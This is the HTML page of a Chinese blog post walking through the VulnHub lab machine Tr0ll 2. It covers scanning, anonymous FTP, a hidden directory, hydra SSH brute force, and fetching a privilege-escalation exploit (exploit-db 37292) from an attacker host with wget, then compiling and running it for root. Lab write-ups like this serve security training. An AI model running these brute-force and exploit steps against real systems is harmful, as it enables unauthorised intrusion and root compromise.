@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Tr0ll | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="vulnhub靶机Tr0ll靶机介绍The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tr0ll">
+<meta property="og:url" content="https://mrfan6.github.io/2022/08/31/Tr0ll/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="vulnhub靶机Tr0ll靶机介绍The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143320664.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143419415.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143741826.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831144059744.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831144230475.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831144927566.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831145442709.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831145624736.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831150956861.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151150571.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151325495.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151435528.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151645346.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831154228466.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831154347820.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831154354882.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831155528048.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831155901467.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160145075.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160331049.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160738260.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160834226.png">
+<meta property="article:published_time" content="2022-08-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-31T08:11:52.243Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143320664.png">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影忍者</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 20px;">靶场</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 10px;">靶机</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/HTML/index.html">火影忍者</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Tr0ll" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/08/31/Tr0ll/" class="article-date">
+      <time datetime="2022-08-30T16:00:00.000Z" itemprop="datePublished">2022-08-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Tr0ll
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="vulnhub靶机Tr0ll"><a href="#vulnhub靶机Tr0ll" class="headerlink" title="vulnhub靶机Tr0ll"></a>vulnhub靶机Tr0ll</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</p>
+<p>Difficulty is beginner++ to intermediate.</p>
+<p>The VM should pull a valid IP from DHCP. This VM has been verified to work on VMware workstation 5, VMware player 5, VMware Fusion, and Virtual box. Virtual box users may need to enable the additional network card for it to pull a valid IP address.</p>
+<p>Special thanks to @Eagle11, @superkojiman and @leonjza for suffering through the testing and the members of #overflowsec on freenode for giving me ideas.</p>
+<p>If you have issues with the machine, feel free to contact me at @Maleus21 or maleus overflowsecurity.com.</p>
+<p>-Maleus</p>
+<p><a target="_blank" rel="noopener" href="http://www.overflowsecurity.com/">www.overflowsecurity.com</a></p>
+<p>Tr0ll2.rar = VMware, Tr0ll2_vbox.rar = VirtualBox</p>
+<p>详细链接以及下载链接:</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll: 2 ~ VulnHub</a></p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.8.0/24 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143320664.png" alt="image-20220831143320664"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.8.11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143419415.png" alt="image-20220831143419415"></p>
+<h3 id="获取端口详细信息"><a href="#获取端口详细信息" class="headerlink" title="获取端口详细信息"></a>获取端口详细信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># -sC: 服务扫描,等价于 --script=default，使用默认类别的脚本进行扫描。</span><br><span class="line"># -A ：选项用于使用进攻性方式扫描</span><br><span class="line"># -sV: 指定让Nmap进行服务版本扫描</span><br><span class="line">nmap -sC -sV -A -p 21,22,80 192.168.8.11 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831143741826.png" alt="image-20220831143741826"></p>
+<p>这里扫描可以看到当前靶机是允许匿名登录ftp的</p>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h3 id="FTP匿名登录"><a href="#FTP匿名登录" class="headerlink" title="FTP匿名登录"></a>FTP匿名登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.8.11</span><br><span class="line">Anonymous</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831144059744.png" alt="image-20220831144059744"></p>
+<h4 id="查看并下载文件"><a href="#查看并下载文件" class="headerlink" title="查看并下载文件"></a>查看并下载文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls 		 #查看文件</span><br><span class="line">get file #下载file文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831144230475.png" alt="image-20220831144230475"></p>
+<p>通过查看文件可以发现只存在一个流量包文件，并将其下载到本地</p>
+<h4 id="分析流量包"><a href="#分析流量包" class="headerlink" title="分析流量包"></a>分析流量包</h4><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831144927566.png" alt="image-20220831144927566"></p>
+<p>发现一句话如下：</p>
+<p>Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P<br>Sucks, you were so close… gotta TRY HARDER!.</p>
+<p>翻译过来就是：</p>
+<p>好吧，好吧，你不是一个聪明的小魔鬼吗，你几乎找到了sup3rs3cr3tdirlol:-P</p>
+<p>糟透了，你离得太近了…得再努力一点！。</p>
+<p>先记录下：<strong>sup3rs3cr3tdirlol</strong></p>
+<h3 id="Web查看"><a href="#Web查看" class="headerlink" title="Web查看"></a>Web查看</h3><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831145442709.png" alt="image-20220831145442709"><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831145624736.png" alt="image-20220831145624736"></p>
+<p>发现就一个页面 也没有js文件 源代码也没有可用信息</p>
+<h4 id="扫文件"><a href="#扫文件" class="headerlink" title="扫文件"></a>扫文件</h4><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831150956861.png" alt="image-20220831150956861"></p>
+<p>通过扫描依然无效</p>
+<h4 id="联系流量包中的关键字"><a href="#联系流量包中的关键字" class="headerlink" title="联系流量包中的关键字"></a>联系流量包中的关键字</h4><p><strong>sup3rs3cr3tdirlol</strong></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.8.11/sup3rs3cr3tdirlol/">http://192.168.8.11/sup3rs3cr3tdirlol/</a></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151150571.png" alt="image-20220831151150571"></p>
+<h5 id="roflmao-文件发现利用"><a href="#roflmao-文件发现利用" class="headerlink" title="roflmao-文件发现利用"></a>roflmao-文件发现利用</h5><p>这里可用发现一个文件，将其下载并分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.8.11//sup3rs3cr3tdirlol/roflmao roflmao #下载文件</span><br><span class="line">file roflmao #查看文件类型</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151325495.png" alt="image-20220831151325495"></p>
+<p>这里可以看到是一个可执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x roflmao #赋予执行权限</span><br><span class="line">./roflmao #执行文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151435528.png" alt="image-20220831151435528"></p>
+<p>Find address 0x0856BF to proceed </p>
+<h5 id="0x0856BF-地址发现利用"><a href="#0x0856BF-地址发现利用" class="headerlink" title="0x0856BF-地址发现利用"></a>0x0856BF-地址发现利用</h5><p>出现<strong>0x0856BF</strong> 前面是发现一个地址，所以应该是一个url地址文件</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831151645346.png" alt="image-20220831151645346"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831154228466.png" alt="image-20220831154228466"></p>
+<p>发现一堆账号名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">maleus</span><br><span class="line">ps-aux</span><br><span class="line">felux</span><br><span class="line">Eagle11</span><br><span class="line">genphlux</span><br><span class="line">usmc8892</span><br><span class="line">blawrg</span><br><span class="line">wytshadow</span><br><span class="line">vis1t0r</span><br><span class="line">overflow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831154347820.png" alt="image-20220831154347820"></p>
+<p>可以根据它目录提示知道：Pass.txt</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831154354882.png" alt="image-20220831154354882"></p>
+<p>根据上面可以知道密码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good_job_:)</span><br><span class="line">Pass.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username -P passwd 192.168.8.11 ssh </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831155528048.png" alt="image-20220831155528048"></p>
+<p>成功爆破出账号密码： <strong>overflow—–Pass.txt</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831155901467.png" alt="image-20220831155901467"></p>
+<p>成功登录用户</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="自动收集漏洞可用脚本"><a href="#自动收集漏洞可用脚本" class="headerlink" title="自动收集漏洞可用脚本"></a>自动收集漏洞可用脚本</h4><p>上传linux-exploit-suggester.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.8.3/linux-exploit-suggester.sh -O /tmp/linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160145075.png" alt="image-20220831160145075"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linux-exploit-suggester.sh</span><br><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160331049.png" alt="image-20220831160331049"></p>
+<h4 id="上传并执行提权脚本"><a href="#上传并执行提权脚本" class="headerlink" title="上传并执行提权脚本"></a>上传并执行提权脚本</h4><p>下载并上传<a target="_blank" rel="noopener" href="https://www.exploit-db.com/download/37292%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E6%94%B9%E5%90%8D%E4%B8%BAofs.c">https://www.exploit-db.com/download/37292，这里我改名为ofs.c</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.8.3/ofs.c -O /tmp/ofs.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160738260.png" alt="image-20220831160738260"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ofs.c -o ofs</span><br><span class="line">./ofs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220831160834226.png" alt="image-20220831160834226"></p>
+<p>成功提权root</p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/08/31/Tr0ll/">Tr0ll</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年08月31日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月31日 - 16时11分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/08/31/Tr0ll/" title="Tr0ll">https://mrfan6.github.io/2022/08/31/Tr0ll/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/08/31/Tr0ll/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2022/08/30/Raven/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Raven2</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BATr0ll"><span class="toc-number">1.</span> <span class="toc-text">vulnhub靶机Tr0ll</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">靶机介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">获取端口详细信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.1.</span> <span class="toc-text">FTP匿名登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B9%B6%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">查看并下载文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%B5%81%E9%87%8F%E5%8C%85"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">分析流量包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">Web查看</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">扫文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E7%B3%BB%E6%B5%81%E9%87%8F%E5%8C%85%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">联系流量包中的关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#roflmao-%E6%96%87%E4%BB%B6%E5%8F%91%E7%8E%B0%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">roflmao-文件发现利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x0856BF-%E5%9C%B0%E5%9D%80%E5%8F%91%E7%8E%B0%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.2.2.</span> <span class="toc-text">0x0856BF-地址发现利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.3.</span> <span class="toc-text">SSH爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E6%BC%8F%E6%B4%9E%E5%8F%AF%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">自动收集漏洞可用脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%B9%B6%E6%89%A7%E8%A1%8C%E6%8F%90%E6%9D%83%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">上传并执行提权脚本</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/08/30/Raven/" title="下一篇: Raven2">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
